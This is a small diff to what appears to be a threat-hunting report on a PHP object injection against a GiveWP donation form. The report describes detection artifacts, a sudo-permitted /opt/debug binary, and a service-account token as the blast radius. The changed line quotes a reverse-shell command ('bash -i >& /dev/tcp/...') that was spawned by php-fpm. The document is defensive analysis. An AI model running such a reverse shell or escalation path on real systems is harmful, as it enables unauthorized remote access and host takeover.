@@ -1108,7 +1108,7 @@ sudo /opt/debug run errur
 ## PHASE 4: THREAT HUNTING & ANOMALY ANALYSIS  
 
 * **Hunt Hypothesis** – *Technique:* PHP‑Object‑Injection (T1059.006) via GiveWP plugin; *Artifacts:* POST to `/donations/the-things-we-need` with serialized payload; *Data Sources:* Web traffic logs, Sysmon process creation for `php-fpm`, network connections to external IPs.  
-* **Behavioral Outliers** – A legitimate donation form generating a background process that connects outbound to an unfamiliar IP (10.10.14.xx). In the container, `php-fpm` spawns a child with command `bash -c 'bash -i >& /dev/tcp/... 0>&1'`.  
+* **Behavioral Outliers** – A legitimate donation form generating a background process that connects outbound to an unfamiliar IP (10.10.14.xx). In the container, `php-fpm` spawns a child with command `bash -c 'bash -i >& /dev/tcp/.... 0>&1'`.  
 * **Toxic Combinations** – The service account (`kubernetes.io/serviceaccount/token`) combined with `sudo -l` allowing `/opt/debug` execution is the blast radius. Any compromise of this token or mis‑configuration of `/opt/debug` leads to full host takeover.
 
 
